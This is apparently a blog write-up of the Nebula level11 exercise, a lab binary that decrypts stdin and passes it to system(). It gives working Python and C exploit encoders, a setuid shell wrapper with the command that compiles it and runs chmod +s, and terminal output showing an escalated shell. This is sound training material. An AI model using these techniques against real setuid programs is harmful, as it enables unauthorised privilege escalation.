+++
author = "pwntester"
categories = ["nebula11"]
date = 2013-11-24T17:54:00Z
description = ""
draft = false
slug = "nebula-level11-write-up"
tags = ["nebula11"]
title = "Nebula level11 write-up"

+++

In [Level11](http://exploit-exercises.com/nebula/level11) we are given the following code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();

  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
    'A' + (random() % 26), '0' + (random() % 10),
    'a' + (random() % 26), 'A' + (random() % 26),
    '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
    buffer[i] ^= key;
    key -= buffer[i];
  }

  system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
    errx(1, "reading from stdin");
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
    errx(1, "invalid header");
  }

  length = atoi(line + strlen(CL));

  if(length < sizeof(buf)) {
    if(fread(buf, length, 1, stdin) != length) {
      err(1, "fread length");
    }
    process(buf, length);
  } else {
    int blue = length;
    int pink;

    fd = getrand(&path);

    while(blue > 0) {
      printf("blue = %d, length = %d, ", blue, length);

      pink = fread(buf, 1, sizeof(buf), stdin);
      printf("pink = %d\n", pink);

      if(pink <= 0) {
        err(1, "fread fail(blue = %d, length = %d)", blue, length);
      }
      write(fd, buf, pink);

      blue -= pink;
    }

    mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if(mem == MAP_FAILED) {
      err(1, "mmap");
    }
    process(mem, length);
  }
}
```

Analyzing the code, there are two different branches leading to the **process()** funcion call that eventually leads to the **system()** function call. This offers us two different ways to exploit this program.

The first one is when the length specified in the **Content-Length** header is greater than 1024. In order to exploit this vulnerable path, we will need to provide the applciation with a valid header specifying a content length bigger or equal to 1024. We will fix the length to 1024 and analyze what we need to put in the content body to execute our arbitrary commands.

If content length is bigger or equal to 1024, the program will open a random file descriptor and copy the contents of the content body to that file. Then, the contents of the file are read into a memory segment allocated in the process space. The last part of the application (**process()**) will decrypt the content body and use the decrypted content as a command to be run by **system()**.

All we need to do is encrypt the command we want to run followed by a **null** byte and fill the rest of the 1024 block with any junk.

The encryption is quite simple, it looks like a [Stream cipher](http://en.wikipedia.org/wiki/Stream_cipher) where we encrypt a set of blocks (in this case, bytes) and we use the encrypted version of a block as the key to encrypt the following block.

```lang-clike line-numbers 
unsigned int key;
int i;

key = length & 0xff;

for(i = 0; i < length; i++) {
  buffer[i] ^= key;
  key -= buffer[i];
}
```

The value used as the **content-length** is used as the initial encryption key but it is anded with 0xff so we will only use the least significant byte. Then the cipher enters a loop where it decrypts one byte a time using the new key for every new block where the new key is calculated as the **previous key - previous decrypted byte**

We can code a python exploit to encrypt the **getflag** command and craft the packet to be sent to the **flag11** program:

```lang-python line-numbers 
#!/usr/bin/env python

command = "getflag\x00"
length = 1024
key = length & 0xff

encrypted = ""
for i in range(len(command)):
     enc = (ord(command[i]) ^ key) & 0xff; # unsigned int
     encrypted += chr(enc)
     key = (key - ord(command[i])) & 0xff # unsigned int

print "Content-Length: " + str(length) + "\n" + encrypted + "A"*(length - len(encrypted))
```

Before trying to exploit it, lets define a new **TEMP** environment variable that the program will look for creating the random file:

```lang-bash line-numbers 
export TEMP=/tmp
```

Its time to exploit the **flag11** program:

```lang-bash line-numbers 
level11@nebula:~$ python exploit.py | /home/flag11/flag11
blue = 1024, length = 1024, pink = 1024
You have successfully executed getflag on a target account
```

A **c** version:

```lang-clike line-numbers 
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void process(char *buffer, int length) {
  unsigned int key;
  int i;

  key = length & 0xff;
  for(i = 0; i < length; i++) {
    buffer[i] ^= key;
    key -= buffer[i] ^ key;
  }
}

#define COMMAND "getflag"

int main(int argc, char *argv[]) {
  char buffer[1024];

  strncpy(buffer, COMMAND, 1024);
  process(buffer, 1024);
  puts("Content-Length: 1024");
  fwrite(buffer, 1, 1024, stdout);
  return 0;
}
```

If we want to get a shell we can use the following setuid shell wrapper:

```lang-clike line-numbers 
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void main(int argc, char *argv[]) {

  uid_t euid = geteuid();
  setresuid(euid, euid, euid);
  system("/bin/sh");
}
```

Now, modify the python exploit to execute the following command:

```lang-bash line-numbers 
command = "gcc -o /tmp/shell /tmp/shell.c; chmod +s /tmp/shell\x00"
```

Run the exploit and look for our setuid shell on /tmp:

```lang-bash line-numbers 
level11@nebula:~$ python exploit.py | /home/flag11/flag11
blue = 1024, length = 1024, pink = 1024
level11@nebula:~$ ls -la /tmp
total 28
drwxrwxrwt  4 root    root    4096 Nov 24 11:50 .
drwxr-xr-x 22 root    root    4096 Dec  6  2011 ..
drwxrwxrwt  2 root    root    4096 Nov 23 21:10 VMwareDnD
-rwsrwsr-x  1 flag11  level11 7241 Nov 24 11:50 shell
-rw-rw-r--  1 level11 level11  180 Nov 24 11:48 shell.c
drwx------  2 root    root    4096 Nov 23 21:10 vmware-root
```

Run the shell:

```lang-bash line-numbers 
level11@nebula:~$ /tmp/shell
sh-4.2$ id
uid=988(flag11) gid=1012(level11) groups=988(flag11),1012(level11)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

Voila!! but we also mentioned that there was a second branch leading to the command execution. If content length is smaller than 1024, then **fread** will read one block of "length" bytes and return the value of blocks read, that will always be **1**. So if we want to avoid the **err** call, we need to set the length to **1**. The problem is that if length is **1** our exploiting proabibilities decrease :(
We can create a bash script named with only one letter like "e":

```lang-bash line-numbers 
level11@nebula:~$ cat e
#!/bin/bash
getflag
```

Now we will create a modified version of our exploit for content-length **1**:

```lang-python line-numbers 
#!/usr/bin/env python

command = "e"
length = 1
key = length & 0xff

encrypted = ""
for i in range(len(command)):
        enc = (ord(command[i]) ^ key) & 0xff; # unsigned int
        encrypted += chr(enc)
        key = (key - ord(command[i])) & 0xff # unsigned int

print "Content-Length: " + str(length) + "\n" + encrypted + "A"*(length - len(encrypted))
```

Our **e** script will be encrypted to **d** so that **flag11** will decrypt it back to **e**. The problem is that we dont have room for the null byte to delimit the command to be executed so we depend on the our luck to get a **00** in the right place:

```lang-bash line-numbers 
level11@nebula:~$ python exploit1.py | /home/flag11/flag11
sh: $'e\020Z': command not found
level11@nebula:~$ python exploit1.py | /home/flag11/flag11
sh: $'eP\357': command not found
level11@nebula:~$ python exploit1.py | /home/flag11/flag11
sh: $'e0\247': command not found
level11@nebula:~$ python exploit1.py | /home/flag11/flag11
getflag is executing on a non-flag account, this doesn't count
```
